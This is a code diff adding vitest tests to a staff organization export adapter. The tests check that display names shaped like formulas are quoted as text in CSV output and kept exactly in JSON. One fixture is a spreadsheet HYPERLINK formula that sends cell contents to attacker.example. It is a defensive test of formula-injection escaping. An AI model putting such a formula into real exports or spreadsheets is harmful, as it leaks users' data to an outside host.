@@ -1,6 +1,8 @@
 import { describe, expect, it } from 'vitest'
 import type { Database } from '#/shared/db'
+import { buildOrganizationExportBundle } from '#/contexts/identity/application/organization-export-contract'
 import type { OrganizationExportContribution } from '#/contexts/identity/application/ports/organization-export-contributor.port'
+import { ORGANIZATION_LIFECYCLE_CONTEXTS } from '#/contexts/identity/domain/organization-lifecycle'
 import { createStaffOrganizationExportContributor } from './staff-organization-export.adapter'
 
 type StubRows = readonly Record<string, unknown>[]
@@ -80,6 +82,27 @@ async function contribute(
   })
 }
 
+function entryText(contribution: OrganizationExportContribution, path: string): string {
+  const entry = contribution.entries.find((candidate) => candidate.path === path)!
+  return Buffer.from(entry.bytes).toString('utf8')
+}
+
+/** Staff's contribution beside an affirmative `no_data` from every other context. */
+function bundleWith(staff: OrganizationExportContribution) {
+  return buildOrganizationExportBundle({
+    organizationId: 'org-staff-export',
+    requestId: 'request-1',
+    asOf: ASOF,
+    contributors: ORGANIZATION_LIFECYCLE_CONTEXTS.map((context) => ({
+      context,
+      contribute: async () =>
+        context === 'staff'
+          ? staff
+          : { context, coverage: 'no_data' as const, omissionCodes: [], entries: [] },
+    })),
+  })
+}
+
 describe('Staff Organization Export contributor', () => {
   it('quotes CSV separators and embedded quotes instead of shifting columns', async () => {
     const contribution = await contribute(POPULATED)
@@ -98,6 +121,34 @@ describe('Staff Organization Export contributor', () => {
     // sliding its own values left.
     expect(lines[2]).toContain('staff_participant_user_link,')
     expect(lines).toHaveLength(3)
+  })
+
+  it('opens a formula-shaped display name as text while the JSON keeps it exact', async () => {
+    // A PropertyManager can set any display name; the AccountAdmin who opens
+    // the export in a spreadsheet must not get a live exfiltrating link.
+    const hostile = '=HYPERLINK("https://attacker.example/leak?d="&A2&A3,"Open")'
+    const contribution = await contribute([
+      [{ snapshot_at: SNAPSHOT_AT }],
+      [{ ...PARTICIPANT, display_name: hostile }],
+      [],
+      [{ ...PARTICIPATION, display_name: '@SUM(A1:A9)' }],
+      [],
+      [],
+    ])
+
+    expect(entryText(contribution, 'staff/participants.csv')).toContain(
+      '"\'=HYPERLINK(""https://attacker.example/leak?d=""&A2&A3,""Open"")"',
+    )
+    expect(entryText(contribution, 'staff/participations.csv')).toContain(
+      ",'@SUM(A1:A9),",
+    )
+    const json = JSON.parse(entryText(contribution, 'staff/participants.json')) as {
+      participants: readonly { display_name: string }[]
+    }
+    expect(json.participants[0].display_name).toBe(hostile)
+    await expect(bundleWith(contribution)).resolves.toMatchObject({
+      version: 'organization-export/v1',
+    })
   })
 
   it('fails closed when the request is older than the bounded snapshot window', async () => {
